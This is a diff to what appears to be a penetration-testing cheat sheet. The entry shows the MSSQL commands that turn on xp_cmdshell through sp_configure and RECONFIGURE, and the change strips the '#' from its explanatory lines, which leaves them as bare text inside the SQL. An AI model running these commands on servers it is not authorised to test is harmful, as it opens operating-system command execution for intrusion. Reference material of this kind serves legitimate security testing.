@@ -1256,19 +1256,19 @@ go
 ## attacking common services - mssql - enable MSSQL command execution (with privileges)
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-# To allow advanced options to be changed.  
+To allow advanced options to be changed.  
 EXECUTE sp_configure 'show advanced options', 1
 go
 
-# To update the currently configured value for advanced options.  
+To update the currently configured value for advanced options.  
 RECONFIGURE
 go  
 
-# To enable the feature.  
+To enable the feature.  
 EXECUTE sp_configure 'xp_cmdshell', 1
 go  
 
-# To update the currently configured value for this feature.  
+To update the currently configured value for this feature.  
 RECONFIGURE
 go
 ```
